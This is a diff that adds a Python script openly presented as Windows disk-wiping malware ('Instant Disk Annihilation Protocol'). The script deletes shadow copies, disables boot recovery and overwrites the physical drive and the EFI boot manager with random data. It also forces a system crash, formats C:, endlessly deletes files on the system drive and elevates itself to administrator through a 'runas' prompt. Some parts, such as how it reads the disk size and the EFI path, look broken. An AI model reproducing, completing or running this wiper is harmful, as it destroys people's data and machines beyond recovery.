@@ -1,0 +1,104 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# [WINDOWS TERMINUS v666] - Instant Disk Annihilation Protocol
+# NO WARNINGS. NO RECOVERY. NO MERCY.
+
+import os
+import sys
+import ctypes
+import struct
+import random
+import subprocess
+from time import sleep
+
+# -=[[ WINDOWS-SPECIFIC ANNIHILATION ]]=-
+# Direct hardware-level destruction sequence
+# Bypasses all safety checks and file locks
+# Permanent firmware corruption vectors
+
+class WindowsEraser:
+    def __init__(self):
+        self.PHYSICAL_DRIVE = r'\\.\PhysicalDrive0'
+        self.WIPE_PASSES = 3  # 0: Chaotic 1: Nulls 2: Chaotic
+        self.CHUNK_SIZE = 8 * 1024 * 1024  # 8MB blocks
+        self.k32 = ctypes.windll.kernel32
+        self.advapi32 = ctypes.windll.advapi32
+        self.ntdll = ctypes.windll.ntdll
+        self._prepare_ground()
+
+    def _prepare_ground(self):
+        subprocess.call('vssadmin delete shadows /all /quiet & wmic shadowcopy delete', shell=True)
+        subprocess.call('bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no', shell=True)
+        subprocess.call('wmic recoveros set AutoReboot=False & wmic recoveros set DebugInfoType=0', shell=True)
+        
+    def _raw_handle(self):
+        return self.k32.CreateFileW(
+            self.PHYSICAL_DRIVE,
+            0x10000000,  # GENERIC_ALL
+            0x00000001 | 0x00000002,  # FILE_SHARE_READ|WRITE
+            None,
+            3,  # OPEN_EXISTING
+            0,
+            None
+        )
+
+    def _chaos_write(self, handle):
+        try:
+            disk_size = self.k32.GetFileSize(handle, None)
+            pattern = os.urandom(self.CHUNK_SIZE)
+            
+            for cycle in range(self.WIPE_PASSES):
+                self.k32.SetFilePointer(handle, 0, None, 0)
+                bytes_written = ctypes.c_ulong()
+                
+                for offset in range(0, disk_size, self.CHUNK_SIZE):
+                    if cycle == 1:  # Null phase
+                        pattern = b'\x55' * self.CHUNK_SIZE  # 0x55 = U (EFI corruption)
+                    self.k32.WriteFile(
+                        handle,
+                        pattern,
+                        min(self.CHUNK_SIZE, disk_size - offset),
+                        ctypes.byref(bytes_written),
+                        None
+                    )
+        finally:
+            self.k32.CloseHandle(handle)
+
+    def _nuke_efi(self):
+        try:
+            with open(r'\\.\\EFI\\Microsoft\\Boot\\bootmgfw.efi', 'wb') as f:
+                f.write(os.urandom(1024*1024))
+        except:
+            pass
+
+    def _destroy_partition(self):
+        try:
+            h = self._raw_handle()
+            self.k32.SetFilePointer(h, 0, None, 0)
+            self.k32.WriteFile(h, os.urandom(1024), 1024, None, None)
+            self.k32.CloseHandle(h)
+        except:
+            pass
+
+    def _trigger_firestorm(self):
+        self.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        self.ntdll.NtRaiseHardError(0xDEADBEEF, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+        subprocess.call('format C: /FS:NTFS /Q /X /P:3', shell=True)
+
+    def run(self):
+        self._nuke_efi()
+        h_disk = self._raw_handle()
+        self._chaos_write(h_disk)
+        self._destroy_partition()
+        self._trigger_firestorm()
+        
+        # Eternal corruption loop
+        while True:
+            subprocess.call('del /f /s /q %systemdrive%\\*.*', shell=True)
+            self.ntdll.ZwSetSystemInformation(0x8D, ctypes.pointer(ctypes.c_ulong(1)), 4, None)
+
+if __name__ == "__main__":
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+    else:
+        WindowsEraser().run()
